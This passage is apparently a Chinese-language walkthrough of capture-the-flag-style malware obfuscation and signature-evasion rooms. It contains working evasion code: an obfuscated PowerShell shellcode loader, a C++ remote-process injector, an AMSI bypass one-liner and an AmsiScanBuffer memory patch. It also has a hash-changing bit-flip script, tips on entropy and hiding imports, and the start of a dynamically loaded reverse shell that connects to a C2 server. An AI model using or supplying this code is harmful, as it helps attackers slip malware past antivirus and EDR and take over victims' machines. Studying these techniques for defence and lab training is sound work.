$var_return_type = [Void] ) $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate]) $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o)) $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o)) return $vtdef.CreateType() } [Byte[]]$vopcode = @(BADGER_SHELLCODE) $vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length) ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null 你可能会注意到一些 cmdlet 和函数保持其原始状态……这是为什么呢？你可能希望创建一个应用程序，它在被检测后仍然能够迷惑逆向工程师，但可能不会显得可疑。如果恶意软件开发者混淆所有 cmdlet 和函数，这会提高解释型和编译型语言的熵，从而导致 EDR 警报分数更高。如果一个解释型代码片段在日志中显得看似随机或明显经过大量混淆，也可能导致其显得可疑。 Code Structure 代码结构 添加垃圾代码（Junk Code）和代码重排（Reordering Code） 目的：增加程序的复杂性，迷惑分析师。 原理：在恶意代码中插入大量无用的、不执行的指令或代码块，或者打乱代码块的原始顺序。这使得分析师难以从一堆杂乱的代码中找出真正的恶意逻辑。 适用范围：这种技术尤其适用于解释型语言（如 Python），因为它们的源代码通常是可见的，分析师可以直接查看。 分离相关代码（Separation of Related Code） 目的：规避**启发式签名（Heuristic Signature）**检测。 原理：启发式引擎会分析代码的上下文。例如，如果 OpenFile 和 EncryptFile 这两个 API 调用在代码中紧挨着出现，启发式引擎就可能判断这是一个勒索软件。攻击者通过随机化这些相关代码的出现位置，将它们分散在程序的各个角落，从而破坏这种上下文关联，欺骗引擎，让它认为这些是无害的独立操作。 File &amp; Compilation Properties 文件和编译属性当程序编译为调试版本时，编译器将包含一个符号文件。符号通常有助于调试二进制映像，并且可以包含全局和局部变量、函数名称和入口点。攻击者必须意识到这些可能的问题，以确保正确的编译实践，并且没有信息泄露给分析人员。 对攻击者来说幸运的是，符号文件可以通过编译器或在编译后轻松移除。要从像 Visual Studio 这样的编译器中移除符号，我们需要将编译目标从 Debug 更改为 Release ，或者使用像 mingw 这样更轻量级的编译器。 如果我们需要从预编译镜像中移除符号，可以使用命令行工具： strip 。 以编译型语言为例，我们可以观察一个用 C++ 编写的进程注入器，它向命令行报告其状态。 123456789101112131415161718192021222324252627#include &quot;windows.h&quot; #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; int main(int argc, char* argv[]) { unsigned char shellcode[] = &quot;&quot;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; string leaked = &quot;This was leaked in the strings&quot;; processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); cout &lt;&lt; &quot;Handle obtained for&quot; &lt;&lt; processHandle; remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); cout &lt;&lt; &quot;Buffer Created&quot;; WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); cout &lt;&lt; &quot;Process written with buffer&quot; &lt;&lt; remoteBuffer; remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); cout &lt;&lt; &quot;Closing handle&quot; &lt;&lt; processHandle; cout &lt;&lt; leaked; return 0; } 让我们使用字符串来准确查看此源代码编译时泄露了什么。 12345678910111213141516171819202122232425262728293031323334353637C:\\&gt;.\\strings.exe &quot;\\Injector.exe&quot; Strings v2.54 - Search for ANSI and Unicode strings in binary images. Copyright (C) 1999-2021 Mark Russinovich Sysinternals - www.sysinternals.com !This program cannot be run in DOS mode. &gt;FU z&#39;; z&#39;; ... [snip] ... Y_^[ leaked shellcode 2_^[] ... [snip] ... std::_Adjust_manually_vector_aligned &quot;invalid argument&quot; string too long This was leaked in the strings Handle obtained for Buffer Created Process written with buffer Closing handle std::_Allocate_manually_vector_aligned bad allocation Stack around the variable &#39; ... [snip] ... 8@9H9T9X9\\\\9h9|9 :$:(:D:H: @1p1 所有的 iostream 都写入了字符串，甚至 shellcode 字节数组也泄露了。这是一个较小的程序，所以想象一下一个功能完善且未混淆的程序会是什么样子！ 我们可以删除注释并替换有意义的标识符来解决这个问题，或者在 Windows 端编译好，拖到 Linux 端过去用 strip filename 就 OK 了，当然你也可以手动处理变量名，不过在这个例子中，你要把那个 string 和打印的字符串处理掉，strip 只会处理你的变量名。 123456789101112131415161718#include &quot;windows.h&quot; int main(int argc, char* argv[]) { unsigned char awoler[] = &quot;&quot;; HANDLE awerfu; HANDLE rwfhbf; PVOID iauwef; awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL); rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL); CloseHandle(awerfu); return 0; } Signature Evasion 特征码规避前几个房间提到了 Shellcode 会有特征，容易被杀软检测，然后又提到了杀软是怎么检测特征的，上一个房间教了混淆的原理，这个房间就是用来具体实践的。 Signature Identification 签名识别杀软是靠的特定的签名去识别恶意片段，所以我们需要找到程序中引起警报的片段。房间这里告诉我们用原生工具 head 、 dd 或 split 来分割已编译的二进制文件，我觉得这个挺繁琐的，后续可以用自动化工具完成这点。 Find-AVSignature 可以给定间隔对提供的字节范围进行分割，但这个也存在缺陷，他需要一个合适的间隔才能正常运行。如果我们给的间隔把一个签名直接在中间截断了，那么是不是就两段分割好的都找不到这个签名了？ 另外这个脚本只观察二进制文件的字符串，而不是使用反病毒引擎的全部功能进行扫描，所以这里需要用其他工具去解决这个，例如 DefenderCheck, ThreatCheck, 和 AMSITrigger。 ThreatCheckThreatCheck 是 DefenderCheck 的一个分支，可以说是在这三者中使用最广泛&#x2F;最可靠的。为了识别可能的签名，ThreatCheck 对拆分的已编译二进制文件利用了多个防病毒引擎，并报告其认为存在可疑字节的位置。 下面是 ThreatCheck 的基本用法，只需要提供一个文件和一个扫描引擎就能用了。 123456789C:\\&gt;ThreatCheck.exe --help -e, --engine (Default: Defender) Scanning engine. Options: Defender, AMSI -f, --file Analyze a file on disk -u, --url Analyze a file from a URL --help Display this help screen. --version Display version information. # Task 3/4实际用法 题目要求用的是 Defender 但是会被 WD 干 所以用 AMSI .\\ThreatCheck.exe -f C:\\Users\\Student\\Desktop\\Binaries\\shell.exe -e AMSI AMSITriggerThreatCheck 扫不了 PowerShell，但是这个工具可以 1234567891011121314151617181920C:\\&gt;amsitrigger.exe --help -i, --inputfile=VALUE Powershell filename -u, --url=VALUE URL eg. &lt;https://10.1.1.1/Invoke-NinjaCopy.ps1&gt; -f, --format=VALUE Output Format: 1 - Only show Triggers 2 - Show Triggers with Line numbers 3 - Show Triggers inline with code 4 - Show AMSI calls (xmas tree mode) -d, --debug Show Debug Info -m, --maxsiglength=VALUE Maximum signature Length to cater for, default=2048 -c, --chunksize=VALUE Chunk size to send to AMSIScanBuffer, default=4096 -h, -?, --help Show Help # 他会告诉你识别的字符串是什么，去把他改掉就行 # -f 使用 3 他会把恶意代码标红 .\\amsitrigger.exe -i bypass.ps1 -f 1 [+] &quot;AmsiUtils&quot; [+] &quot;amsiInitFailed&quot; 这里的 bypass.ps1 是上个房间让我们混淆用的 1[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) Static Code-Based Signatures 基于静态代码的签名现在我们鉴别出了有问题的签名，就要着手处理他了。在前面提到的论文中提到了很多在“混淆方法”和“混淆类别”层中有效的解决方案。 Obfuscating methods 混淆方法 混淆方法 目的 方法代理 创建一个代理方法或替换对象 方法分散&#x2F;聚合 将多种方法合并为一种，或将一种方法拆散成多个部分将多种方法合并为一种，或将一种方法拆散成多个部分 方法克隆 创建一个方法的副本并随机调用每个副本 这三个都是代码混淆中常用的技术，目的是改变代码的结构，让逆向分析变得更困难。下面我来详细解释一下它们的实现方式和原理。 1. 方法代理（Method Proxying） 目的：创建一个“代理”方法来代替原始方法，以此隐藏原始方法的直接调用关系。 实现方式： 攻击者不会直接调用 original_function()，而是创建一个中间层——proxy_function()。proxy_function() 的唯一作用就是调用 original_function()。 混淆原理： 对于静态分析工具来说，它只能看到对 proxy_function() 的调用，而无法直接看到对原始方法的调用。这使得分析师必须多走一步，先分析代理函数，才能找到真正的目标函数。在实际应用中，攻击者会创建大量毫无意义的代理函数，形成一个复杂的调用链，让分析师陷入“代理”的迷宫。 12345678910111213// 原始调用 call original_function() // 代理后的调用 call proxy_function_a() ... proxy_function_a() { call proxy_function_b() } ... proxy_function_b() { call original_function() } 2. 方法分散&#x2F;聚合（Method Scattering&#x2F;Aggregation） 这个混淆方式有两种相反的操作，但目的都是为了打乱代码的组织结构。 方法分散（Scattering）： 目的：将一个完整的函数拆分成多个小的、不连续的代码块，并将它们分散在程序的各个角落。 实现方式：攻击者会将一个函数 original_function() 拆分成 original_function_part1、original_function_part2 等。当程序执行时，它会通过复杂的跳转指令或函数调用，将这些分散的部分重新拼接起来执行。 混淆原理：这破坏了代码的连续性。分析师无法通过简单地从上到下阅读代码来理解其功能。他们必须手动跟踪每一个跳转和调用，才能将所有代码块拼凑完整。 方法聚合（Aggregation）： 目的：将多个功能不相关的函数或代码块合并到一个巨大的函数中。 实现方式：攻击者会将多个函数，比如 download_file() 和 encrypt_data()，合并成一个名为 complex_function() 的函数。 混淆原理：这使得 complex_function() 变得非常庞大且难以理解。分析师必须在一大堆看似无关的代码中，找出并分离出那些真正执行恶意功能的代码，工作量呈指数级上升。 3. 方法克隆（Method Cloning） 目的：为同一个方法创建多个功能完全相同的副本，并随机调用这些副本。 实现方式： 攻击者会为 original_function() 创建多个副本，例如 original_function_clone1()、original_function_clone2() 等。这些副本的内部代码可能完全相同，或者经过了轻微的混淆（比如改变了寄存器使用顺序）。在调用时，程序会随机选择一个副本进行调用。 混淆原理： 当杀毒软件的静态签名引擎发现一个可疑的函数时，它会为这个函数建立一个签名。但如果存在成百上千个功能相同但字节码不同的克隆函数，杀毒软件就无法为它们一一建立签名。同时，这也使得分析师的工作变得重复且乏味，因为他们必须分析每一个克隆副本，才能确定其真实功能。 Obfuscating Classes 混淆类 混淆方法 目的 类层次扁平化 使用接口为类创建代理 类拆分&#x2F;合并 将局部变量或指令组转移到另一个类 删除修饰符 移除类修饰符（public、private），并将所有成员设置为 public 1. 类层次扁平化 (Class Hierarchy Flattening) 目的: 移除复杂的继承关系，使所有类都看起来是独立的，隐藏它们之间的逻辑联系。 实现原理: 攻击者会消除类之间的继承（extends）或接口实现（implements）关系。原始代码中，子类可能继承父类的多个方法和属性，但在混淆后，这些继承来的方法和属性会被直接复制到子类中。这样一来，复杂的类层次结构就会被“拍平”，变成一堆互不相干的独立类。 混淆原理: 这种技术让分析师无法通过观察继承链来推断类的功能和关系。分析师必须单独检查每一个类，以确定其所有功能，工作量大大增加。 2. 类拆分&#x2F;合并 (Class Splitting&#x2F;Merging) 目的: 打乱类的内部结构，使代码的逻辑分散或集中，从而混淆分析。 实现原理: 拆分 (Splitting): 将一个类中的局部变量或方法，移动到另一个不相关的类中。例如，一个恶意类的关键数据或方法可能被拆分到多个不同的、看起来无害的类中。 合并 (Merging): 将多个类中的代码聚合到一个单一的、巨大的类中。这会使类变得异常庞大且难以理解。 混淆原理: 这种混淆技术破坏了面向对象编程的封装性。它使得分析师无法通过类的名字或功能来快速定位关键代码。如果一个类包含了太多无关的功能，或者一个功能被分散到多个类中，分析师就很难追踪完整的执行流程。 3. 删除修饰符 (Modifier Removal) 目的: 移除类和方法的修饰符（如 public、private），并把所有成员设为 public，以此来混淆代码的访问权限和结构。 实现原理: 攻击者会修改代码，使所有类和方法的修饰符都被删除或替换为 public。例如，private 变量和 protected 方法都会被修改为 public。 混淆原理: 这种做法破坏了面向对象编程的访问控制和封装原则。在正常的代码中，private 意味着这个方法或变量只能在类内部使用，这为分析师提供了重要的上下文线索。当所有成员都变为 public 后，分析师就无法通过访问权限来推断代码的内部逻辑，从而增加了分析的难度。 核心混淆思想的归纳1. 拆分与合并 所有与“拆分”或“合并”相关的混淆技术，无论是类拆分&#x2F;聚合（class splitting/coalescing）还是方法分散&#x2F;聚合（method scattering/aggregation），它们的核心目的只有一个：打破代码的正常组织结构，使其难以被分析师追踪。 实现原理：它们通过改变代码的“大小”和“位置”来制造混乱。一个原本逻辑清晰、封装良好的代码块（无论是类还是方法），会被拆得四分五裂或者被合并成一个臃肿的巨兽。 最终目的：让分析师无法通过观察代码的常规结构（如类的边界、函数的开始与结束）来理解其功能。分析师必须耗费大量时间，手动将这些被分散的代码片段重新拼凑起来。 2. 隐藏和混淆可识别信息 另一类混淆技术，包括删除修饰符（dropping modifiers）和方法克隆（method clone），其核心作用是：剥离或隐藏任何能为分析师提供线索的“元数据”。 实现原理：这些方法不改变代码的逻辑，而是针对那些帮助人类理解代码的“标签”进行操作。 删除修饰符会移除像 public、private 这样的访问权限，破坏了面向对象编程的封装性，让分析师无法通过这些修饰符来推断代码的内部逻辑。 方法克隆则通过制造大量功能相同但代码形式不同的副本，来规避基于签名的检测，并让分析师陷入无止境的重复分析。 最终目的：让恶意代码在静态分析阶段看起来毫无特征，并且不提供任何可供参考的“线索”，迫使分析师从零开始进行行为分析。 Splitting and Merging Objects 拆分与合并对象这个和之前拼接字符串很相似，在原理上是相等的，不过我们这里要操作的是一个字符串对象。尽管他是一个字符串，但是在面向对象语言里面万物皆对象。 原会被检测的字符串 1string MessageFormat = @&quot;{{&quot;&quot;GUID&quot;&quot;:&quot;&quot;{0}&quot;&quot;,&quot;&quot;Type&quot;&quot;:{1},&quot;&quot;Meta&quot;&quot;:&quot;&quot;{2},&quot;&quot;IV&quot;&quot;:&quot;&quot;{3}&quot;&quot;,&quot;&quot;EncryptedMessage&quot;&quot;:&quot;&quot;{4}&quot;&quot;,&quot;&quot;HMAC&quot;&quot;:&quot;&quot;{5}&quot;&quot;}}&quot;; 混淆的方法 通过构造一个字符串类来规避检测，这个只是能过静态，字符串的拼接是在运行时执行的，所以能绕过静态签名检测 123456789101112131415public static string GetMessageFormat // Format the public method { get // Return the property value { var sb = new StringBuilder(@&quot;{{&quot;&quot;GUID&quot;&quot;:&quot;&quot;{0}&quot;&quot;,&quot;); // Start the built-in concatenation method sb.Append(@&quot;&quot;&quot;Type&quot;&quot;:{1},&quot;); // Append substrings onto the string sb.Append(@&quot;&quot;&quot;Meta&quot;&quot;:&quot;&quot;{2}&quot;&quot;,&quot;); sb.Append(@&quot;&quot;&quot;IV&quot;&quot;:&quot;&quot;{3}&quot;&quot;,&quot;); sb.Append(@&quot;&quot;&quot;EncryptedMessage&quot;&quot;:&quot;&quot;{4}&quot;&quot;,&quot;); sb.Append(@&quot;&quot;&quot;HMAC&quot;&quot;:&quot;&quot;{5}&quot;&quot;}}&quot;); return sb.ToString(); // Return the concatenated string to the class } } string MessageFormat = GetMessageFormat Removing and Obscuring Identifiable Information 删除和模糊可识别信息这个和之前用过的模糊变量名是一样的，下面是我处理好的 PowerShell 脚本，可以看到里面的变量名没变，处理过的是写死的字符串和数组，在运行时拼接。 12345678910111213141516171819202122232425262728293031$MethodDefinition = &quot; [DllImport(`&quot;kernel32`&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(`&quot;kernel32`&quot;)] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport(`&quot;kernel32`&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); &quot;; $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#39;Kernel32&#39; -NameSpace &#39;Win32&#39; -PassThru; $A = &quot;Ams&quot; + &quot;iSca&quot; + &quot;nBu&quot; + &quot;ffer&quot; $handle = [Win32.Kernel32]::GetModuleHandle(&#39;amsi.dll&#39;); [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A); [UInt32]$Size = 0x5; [UInt32]$ProtectFlag = 0x40; [UInt32]$OldProtectFlag = 0; [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag); $buf0 = [UInt32]0xB8; $buf1 = [UInt32]0x57; $buf2 = [UInt32]0x00; $buf3 = [UInt32]0x07; $buf4 = [Uint32]0x80; $buf5 = [Uint32]0xC3; $buf = $buf1 + $buf2 + $buf3 + $buf4 + $buf5 [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); Static Property-Based Signatures 基于静态属性的特征签名各种杀软和分析人员可能会考虑到不同的因素，而不是仅仅依赖字符串和静态签名去检验一个文件是否安全。签名实际上可以附加到很多文件属性上，比如哈希、熵、作者、名称或其他可识别的信息，这些可以单独使用或结合使用。 有些属性可能很容易被操纵，但有些很难被处理，尤其是在处理预编译的闭源应用程序时，这里我们会提到控制文件 Hash 和引入一个熵的概念。 File Hashes 文件 Hash哈希（也叫校验和）是文件的唯一指纹，用于识别文件是否被篡改或验证其用途（比如是否为恶意）。对文件的任何修改，哪怕只是一点点，都会导致哈希值完全改变。 对于有源代码的应用：我们可以修改任意代码，然后重新编译，轻松得到一个新哈希。 对于已编译或已签名的应用：我们无法修改源代码，这时就需要使用**比特翻转（bit-flipping）**技术。 比特翻转是一种常见的攻击手段，它会逐个翻转并测试文件中的每一个比特，直到找到一个既能改变文件哈希，又不会破坏程序功能的“幸运”比特。这样一来，恶意软件就能在保持功能不变的情况下，获得一个全新的哈希值，从而绕过基于哈希的静态检测。 我们可以使用脚本自动化通过翻转每一位比特： 12345678910111213141516import sys orig = list(open(sys.argv[1], &quot;rb&quot;).read()) i = 0 while i &lt; len(orig): current = list(orig) # 它读取当前字节 i 的值，将其与十六进制值 0xde 进行异或（XOR）运算。异或运算会翻转字节中的某些位，从而改变其值。 current[i] = chr(ord(current[i]) ^ 0xde) path = &quot;%d.exe&quot; % i output = &quot;&quot;.join(str(e) for e in current) open(path, &quot;wb&quot;).write(output) i += 1 print(&quot;done&quot;) 生成变体后，我们可以利用一个脚本遍历按位翻转的列表并使用 signtool 这样的工具自动筛选可用的 exe，下面是一个批处理脚本。 123FOR /L %%A IN (1,1,10000) DO ( signtool verify /v /a flipped\\\\%%A.exe ) Entropy 熵“熵”（Entropy）指的是文件中数据的随机性。在安全领域，EDR 和其他扫描工具常用它来判断一个文件是否包含隐藏数据或可疑脚本。因为高度随机的数据（高熵值）可能意味着文件被加密或混淆了。 高熵值：通常表明数据是经过加密或混淆的，这会引起安全工具的警觉。 低熵值：通常表明数据是普通文本或未加密的代码。 为了降低熵值，我们可以将恶意代码中高度随机的混淆标识符（如 q234uf）替换成随机选取的普通英文单词（如 nature）。这样，文件看起来就不那么“随机”，从而降低其熵值，帮助规避检测。这里我们可以使用 CyberChef 观察熵是如何变化的。 Behavioral Signatures 行为特征签名通过混淆方法和属性确实能规避掉检测，但是现代的杀软仅仅过静态是没用的，他还会观察我们的程序的行为特征。 现代杀毒引擎会采用两种常见的方法来检测恶意行为：观察导入表和 Hook 已知的恶意调用。 导入表导入表是可执行文件（如.exe或.dll）中的一个部分，它列出了程序运行时需要从其他动态链接库（DLL）中调用的所有外部函数。这些函数通常是操作系统提供的核心API，比如 CreateProcess (创建新进程)、WriteFile (写入文件) 或 InternetConnect (连接到互联网)。 杀毒引擎会扫描程序的导入表。如果一个程序导入了大量与恶意行为相关的函数，即使它还没有运行，杀毒引擎也会将它标记为可疑。例如，一个看似简单的文本编辑器如果导入了 SetWindowsHookEx (键盘记录) 和 InternetConnect (网络通信) 等函数，就会被视为高风险。 但是导入表可以通过很少的步骤就能被混淆掉，而 Hook 就需要高阶技术了。 API 调用在基于 C 语言的程序中，传统的 API 调用流程主要解决了两个核心问题：如何找到 API 函数的地址，以及如何在运行时调用它们。这个过程可以分为以下几个关键步骤。 1. 问题：动态的函数地址 程序的 API 调用和操作系统的原生函数需要一个指向内存地址的指针。这看似简单，但由于 **ASLR（地址空间布局随机化）**的存在，操作系统每次启动程序时，都会将 DLL（如 kernel32.dll 或 ntdll.dll）加载到不同的内存地址。这意味着，我们不能在编译时就确定函数的具体地址，它在运行时是动态变化的。 2. 解决方案：Windows 加载器 为了解决这个问题，Windows 操作系统提供了一个核心组件：Windows 加载器。程序不需要自己费力地在运行时寻找并修改函数地址，这个繁重而复杂的任务都交给了加载器。当程序启动时，加载器会负责将所有必需的模块（DLL）加载到内存中，并找到每个函数的确切地址。 3. 关键机制：导入地址表 (IAT) Windows 加载器用来存储这些动态地址的核心机制是 IAT（导入地址表）。 IAT 的位置：IAT 是 PE（可移植可执行文件）头的一部分，具体位于 IMAGE_OPTIONAL_HEADER 中。 IAT 的作用：在程序刚加载到内存时，IAT 中的条目是空的。在程序运行前，Windows 加载器会遍历所有导入的函数，找到它们在内存中的真实地址，然后将这些地址填入 IAT 相应的位置。 4. 最终调用：Thunk 为了获取这些真实地址，加载器会访问一个指针表，这个表包含了指向 thunk 的指针。简单来说，thunk 是一个包含了跳转指令的简短代码段，它最终将执行流重定向到 API 函数的真实地址。因此，加载器实际上是将一个指向 thunk 的指针作为 API 函数的最终调用地址分配给 IAT。 通过这个复杂的流程，程序就能在运行时，通过查询 IAT，找到并正确调用它需要的操作系统 API，确保即使在 ASLR 的环境下也能正常运行，下图是一个 thunk 表的示例： 动态加载：绕过导入表 (IAT)**导入表（IAT）**能为安全分析师提供关于二进制文件功能的关键信息，这对攻击者来说是极其不利的。那么，如何在需要为函数分配地址的情况下，又防止自己的函数出现在 IAT 中呢？ 答案是使用**动态加载（Dynamic Loading）**技术。 传统方式：Windows 加载器在程序启动时，会自动为所有导入的函数填充 IAT，使分析师能轻松看到程序将要调用的所有 API。 动态加载方式：与此不同，动态加载不依赖于 IAT 和 Windows 加载器在启动时的自动处理。它是一种在程序运行时才获取 API 地址的技术。 简单来说，动态加载就是利用 API 调用本身来获取其他 API 的地址。这种方法可以有效地绕过 IAT，并最大限度地减少对 Windows 加载器的依赖，从而隐藏程序的真实行为。 动态加载的实现步骤 在 C 语言中，动态加载一个 API 调用通常分为以下四个步骤： 定义调用结构：在主函数之前，需要先定义目标 API 的结构。这个结构描述了该 API 所需的输入和输出，其详细信息可以从微软的官方文档中找到。 获取模块句柄：获取包含目标 API 的动态链接库（DLL）的句柄。 获取函数地址：通过模块句柄，获取目标函数的实际内存地址。 使用新调用：利用获取到的地址，调用目标 API。 在 C 语言中，你不能直接调用一个动态加载的函数。你需要先定义一个函数指针类型，来告诉编译器这个函数长什么样，包括它的返回值和参数类型。这个结构可以在微软的官方文档中找到。 例如，对于 GetComputerNameA 这个 API，它的结构可以被定义为： 12345// 1. 定义调用结构 typedef BOOL (WINAPI* myNotGetComputerNameA)( LPSTR lpBuffer, LPDWORD nSize ); 这段代码创建了一个名为 myNotGetComputerNameA 的新类型，它是一个函数指针，指向一个返回 BOOL，并接受 LPSTR 和 LPDWORD 作为参数的函数。 接下来，你需要加载包含目标 API 的动态链接库（DLL），并获取它的内存句柄。对于 Windows API 来说，这个库通常是 kernel32.dll 或 ntdll.dll。 12// 2. 获取包含调用地址的模块的句柄 HMODULE hkernel32 = LoadLibraryA(&quot;kernel32.dll&quot;); LoadLibraryA 函数负责将 kernel32.dll 加载到进程的内存空间中，并返回一个句柄，这个句柄是后续操作的“钥匙”。 现在，你有了 DLL 的句柄，可以利用 GetProcAddress 函数来获取你需要的 API 的真实内存地址。 12// 3. 获取调用的进程地址 myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, &quot;GetComputerNameA&quot;); GetProcAddress 接受模块句柄和函数名作为参数，返回该函数在内存中的实际地址。由于返回的是一个通用指针，我们需要将其强制转换为我们在第一步中定义的函数指针类型，以便正确调用。 尽管动态加载是一种有效的混淆技术，但它并非万无一失。 LoadLibraryA 和 GetProcAddress 的暴露：即使你成功隐藏了对恶意 API 的直接调用，LoadLibraryA 和 GetProcAddress 这两个函数本身仍然会出现在程序的导入表（IAT）中。这本身就是一个可疑的信号，因为许多恶意软件都依赖于这两个函数来动态加载 payload。 对抗现代安全引擎：高级的安全代理（如 EDR）不仅会监控导入表，还会通过**API 挂钩（API Hooking）**来监视程序的行为。即使你通过动态加载获得了地址，这些安全引擎也可能在函数被调用时拦截并分析其行为。 为了应对这些更高级的检测手段，攻击者需要使用更复杂的混淆技术，例如位置无关代码 (PIC) 来解决 IAT 暴露问题，以及 **API 脱钩（API Unhooking）**来规避行为监控。 实践实际上就是通过 GetProcAddress 获取到的函数的实际的调用地址，而不是用传统的导入调用，当然你也可以直接使用 GetComputerNameA 方法，不过他会出现到 IAT 中。如果用动态加载，程序的导入表中只会有 LoadLibraryA 和 GetProcAddress 这两个函数，原理就是这么个样，看怎么理解咯。 12345678910111213141516171819#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;lm.h&gt; typedef BOOL (WINAPI *myNotGetComputerNameA)( LPSTR lpBuffer, LPDWORD nSize ); int main() { HMODULE hkernel32 = LoadLibraryA(&quot;kernel32.dll&quot;); myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, &quot;GetComputerNameA&quot;); CHAR hostName[260]; DWORD hostNameLength = 260; if (notGetComputerNameA(hostName, &amp;hostNameLength)) { printf(&quot;hostname: %s\\\\n&quot;, hostName); } } 大杂烩需要你用尽毕生所学，做一个满足下面要求的 shell。 没有可疑的库调用 没有泄露的函数或变量名 文件哈希值与原始哈希值不同 二进制文件可绕过常见的反病毒引擎 首先分析一下需求： 第一点，可以用动态加载完成，在前面就提到了 第二点，变量名和函数都可以用随机字符串代替 第三点我不知道啥意思 第四点就是消灭文件签名咯。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;winsock2.h&gt; #include &lt;windows.h&gt; #include &lt;ws2tcpip.h&gt; #include &lt;stdio.h&gt; #define DEFAULT_BUFLEN 1024 // 声明好方法签名 typedef int(WSAAPI *WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData); typedef SOCKET(WSAAPI *WSASOCKETA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags); typedef unsigned(WSAAPI *INET_ADDR)(const char *cp); typedef u_short(WSAAPI *HTONS)(u_short hostshort); typedef int(WSAAPI *WSACONNECT)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS); typedef int(WSAAPI *CLOSESOCKET)(SOCKET s); typedef int(WSAAPI *WSACLEANUP)(void); void RunShell(char *C2Server, int C2Port) { HMODULE hws2_32 = LoadLibraryW(L&quot;ws2_32&quot;); WSASTARTUP myWSAStartup = (WSASTARTUP)GetProcAddress(hws2_32, &quot;WSAStartup&quot;); WSASOCKETA myWSASocketA = (WSASOCKETA)GetProcAddress(hws2_32, &quot;WSASocketA&quot;); INET_ADDR myinet_addr = (INET_ADDR)GetProcAddress(hws2_32, &quot;inet_addr&quot;); HTONS myhtons = (HTONS)GetProcAddress(hws2_32, &quot;htons&quot;); WSACONNECT myWSAConnect = (WSACONNECT)GetProcAddress(hws2_32, &quot;WSAConnect&quot;); CLOSESOCKET myclosesocket = (CLOSESOCKET)GetProcAddress(hws2_32, &quot;closesocket&quot;); WSACLEANUP myWSACleanup = (WSACLEANUP)GetProcAddress(hws2_32, &quot;WSACleanup&quot;); SOCKET mySocket; struct sockaddr_in addr; WSADATA version; myWSAStartup(MAKEWORD(2, 2), &amp;version); mySocket = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0); addr.sin_family = AF_INET; addr.sin_addr.s_addr = myinet_addr(C2Server); addr.sin_port = myhtons(C2Port); if (myWSAConnect(mySocket, (SOCKADDR *)&amp;addr, sizeof(addr), 0, 0, 0, 0) == SOCKET_ERROR) { myclosesocket(mySocket); myWSACleanup(); } else { printf(&quot;Connected to %s:%d\\\\n&quot;, C2Server, C2Port); char Process[] = &quot;cmd.exe&quot;; STARTUPINFO sinfo; PROCESS_INFORMATION pinfo; memset(&amp;sinfo, 0, sizeof(sinfo)); 